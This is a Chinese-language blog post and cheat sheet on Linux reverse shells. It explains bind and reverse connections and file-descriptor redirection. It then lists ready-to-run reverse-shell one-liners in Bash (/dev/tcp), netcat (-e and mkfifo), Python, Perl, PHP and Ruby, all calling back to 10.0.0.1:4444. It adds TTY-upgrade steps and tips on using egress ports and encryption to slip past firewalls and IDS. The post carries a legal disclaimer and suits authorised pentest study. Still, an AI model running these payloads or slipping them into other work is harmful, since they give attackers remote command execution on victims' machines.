+++
title = "Linux 反弹 Shell"
date = "2025-01-12"
lastmod = "2025-01-12"
subtitle = "原理、姿势与命令速查"
description = "介绍 Linux 反弹 Shell（Reverse Shell）的工作原理与适用场景，汇总 Bash、Netcat、Python、Perl、PHP 等常用一键 Payload 与 PTY 升级技巧。"
author = "小智晖"
authors = ["小智晖"]
categories = ["server"]
tags = ["server", "linux", "security", "pentest", "reverse-shell", "netcat"]
keywords = ["反弹Shell", "Reverse Shell", "Netcat", "渗透测试", "Bash /dev/tcp", "PTY 升级"]
toc = true
draft = false
+++

## 前言

在渗透测试（Penetration Testing）和攻防演练中，Linux 主机上获取一个可交互的命令行是最常见的诉求之一。当目标机由于防火墙、NAT、动态 IP 等原因无法被直接访问时，常规的「正向连接」就会失效，此时需要用到**反弹 Shell（Reverse Shell，又称反向 Shell）**。

所谓反弹 Shell，是指攻击机在某个 TCP/UDP 端口上监听作为服务端，由目标机**主动**向攻击机发起连接，并将自身的标准输入、标准输出、标准错误重定向到这条连接上。这样攻击者就在目标机上得到了一个可以执行命令的 Shell。

> 法律与道德提示：本文涉及的技术仅可用于授权的安全测试、CTF 竞赛或自有系统的学习研究。未经授权对他人系统使用相关技术，可能违反《网络安全法》《刑法》第二百八十五条等相关法律法规。请在合法合规的前提下学习。

## 正向连接 vs 反向连接

理解反弹 Shell，需要先区分两种连接方向。

**正向连接（Bind Shell / Forward Connection）**

攻击者主动去连接目标机监听的端口，形式为 `攻击者 -> 目标IP:目标端口`。SSH、Telnet、远程桌面、Web 服务都是典型的正向连接。对应地，目标机主动开端口等连接的 Shell 称为 **Bind Shell**：

```bash
# 目标机（监听端，需要有 -e 支持）
nc -lvp 4444 -e /bin/sh

# 攻击机（连接端）
nc 目标IP 4444
```

**反向连接（Reverse Connection）**

由目标机主动连接攻击机监听的端口，形式为 `受害者 -> 攻击机IP:攻击机端口`。攻击机作为服务端监听，目标机作为客户端发起连接。

反向连接通常用于以下场景：

- 目标机位于防火墙之后，只允许出站流量，禁止入站连接；
- 目标机端口被占用或无法监听新端口；
- 目标机处于内网（NAT）中，或 IP 动态变化，攻击机无法直连；
- 目标机上线时间、网络环境不可预期（如木马、恶意样本分析场景）；
- 远程桌面、SSH 等正向服务不可用或被禁用。

在这些场景下，正向连接走不通，反弹 Shell 是更可行的选择。

## 原理：文件描述符的重定向

反弹 Shell 的本质是 Unix 的**文件描述符（File Descriptor, FD）重定向**：

- `FD 0`：标准输入（stdin）
- `FD 1`：标准输出（stdout）
- `FD 2`：标准错误（stderr）

攻击机先监听端口，目标机建立 TCP 连接后，把这条 Socket 连接当作一个文件，然后把 `/bin/sh` 的 `0、1、2` 三个文件描述符全部重定向到这个 Socket 上。于是目标机上 Shell 的输入输出就通过 Socket 流向了攻击机，攻击者便得到了一个远程交互终端。

理解这一点后，下面各种姿势都是同一思想的不同实现。

## 攻击机监听端

无论用哪种语言弹 Shell，攻击机这一侧都需要先准备好监听。最常用的是 Netcat：

```bash
# 经典监听：-l 监听，-v 详细输出，-n 不解析 DNS，-p 指定端口
nc -lvnp 4444
```

如果系统安装的是 Nmap 的 **Ncat**，写法更直观：

```bash
ncat -lvnp 4444
```

监听就绪后保持窗口不要关闭，等待目标机回连即可。

## 常见反弹 Shell 姿势

具体用哪种姿势，取决于目标主机上的可用环境：装了 `netcat` 就用 netcat，有 Python 解释器就用 Python，有 PHP/Perl/Ruby 同理。

### Bash

利用 Bash 内置的 `/dev/tcp/HOST/PORT` 虚拟设备（pseudo-device）。注意：这是 Bash 编译时启用 `--enable-net-redirections` 才有的特性，**不是真实的设备文件**，在 `dash`、`ash`、`busybox sh` 等最小化 POSIX Shell 中不可用。

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

逐段拆解：

- `bash -i`：启动一个交互式 Bash；
- `>& /dev/tcp/...`：将 stdout（FD 1）和 stderr（FD 2）重定向到这条 TCP 连接；
- `0>&1`：将 stdin（FD 0）也重定向到与 FD 1 相同的位置，即这条连接。

这是最简洁的一行式反弹，但前提是 `/bin/sh` 真的链接到 Bash。

### Netcat

最经典的姿势是利用 netcat 的 `-e`（execute）选项，让 netcat 在连接建立后执行一个程序：

```bash
# 目标机（需要 nc.traditional / Ncat 这种支持 -e 的版本）
nc -e /bin/sh 10.0.0.1 4444
```

但 OpenBSD 版本的 `nc.openbsd`（Debian/Ubuntu 默认）**移除了 `-e` 选项**，此时可以利用命名管道（FIFO）实现等效效果：

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

原理：`mkfifo` 创建一个先进先出的命名管道文件，`cat` 从中读取攻击机发来的命令交给 `/bin/sh` 执行，输出再通过 `nc` 发送回攻击机，同时把 `nc` 收到的数据写回管道，形成闭环。

### Python

环境里有 Python 时非常通用，且跨平台：

```bash
# Linux
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

核心逻辑：建立 TCP 连接后，用 `os.dup2` 把 Socket 的文件描述符复制到 FD 0/1/2，再用 `subprocess.call` 起一个交互式 Shell。

### Perl

Perl 在老式 Unix 系统和 minimal 镜像中往往预装，作为兜底语言很实用：

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP

适用于拿下 Web Shell 后，服务器侧有 PHP CLI 的情况：

```bash
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> 提示：`fsockopen` 返回的描述符在不同 PHP 版本下可能是 `3`、`4`、`5`、`6`，如果第一次失败可以逐个尝试。

### Ruby

```bash
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

> 上述各语言版本中，`10.0.0.1` 是攻击机 IP，`4444` 是攻击机监听端口，使用时替换为实际值。这些 Payload 是社区长期沉淀的经典形式，广泛出现在 PentestMonkey、PayloadsAllTheThings、HackTricks 等公开参考资料中。

## 从哑终端升级到完整 TTY

直接通过上述方式得到的往往是一个「哑终端（dumb shell）」：没有作业控制，无法使用 `Ctrl+C`、Tab 补全，运行 `su`、`vi`、`less` 等需要 TTY 的程序会报错。需要把它升级为**完整的伪终端（PTY）**。

最常用的方法是借助 Python 的 `pty` 模块（官方文档明确说明 `pty.spawn()` 可将子进程连接到伪终端）：

```bash
# 第一步：在哑 Shell 中执行，分配一个 PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

此时 Shell 已经有 TTY 了，但行为还不够完美。继续：

```bash
# 第二步：按 Ctrl+Z 把会话放到后台
# 第三步：在攻击机的终端里，让本地终端进入 raw 模式
stty raw -echo; fg
# 第四步：回到会话后设置终端类型与行列数
export TERM=xterm-256color
stty rows 40 columns 120
```

完成后即可获得几乎与 SSH 体验一致的交互式 Shell，支持 Tab 补全、`vi`、`less`、`su`、信号控制等。

## 实践要点

- **先选语言，再写 Payload**：先 `which python3 nc perl ruby` 探明目标环境，避免使用不存在的解释器。
- **注意 Shell 类型**：Bash 的 `/dev/tcp` 不可移植，`dash`、`ash` 下会报 `No such file or directory`。
- **注意 netcat 变体**：`nc.openbsd` 无 `-e`，`nc.traditional` 和 Ncat 有 `-e`/`--exec`；前者用 FIFO 绕过。
- **端口选择**：避开目标机出站防火墙封锁的端口。`443`、`80`、`53`（DNS）等常用出站端口更易成功。
- **监听端持久**：用 `nc -lkp` 或 Ncat 的 `--keep-open` 保持持续监听，避免漏掉回连。
- **流量明文风险**：反弹 Shell 的流量默认是明文，IDS/IPS 可通过 `/dev/tcp`、`mkfifo + nc` 等模式特征识别。必要时可借助 `openssl s_client`、`socat` 包装为加密通道。

## 参考

- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
- [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Ncat Users' Guide — Exec](https://nmap.org/ncat/guide/ncat-exec.html)
- [Python 文档 — pty 模块](https://docs.python.org/3/library/pty.html)
- [Advanced Bash-Scripting Guide — /dev 与 /proc](https://tldp.org/LDP/abs/html/devref1.html)
- [反弹 Shell，看这一篇就够了（先知社区）](https://xz.aliyun.com/t/9488)
- [OscpStudyGroup — 反弹 Shell 方法汇总](https://github.com/xuanhusec/OscpStudyGroup)
- [多种姿势反弹 Shell（Brucetg's Blog）](https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/)
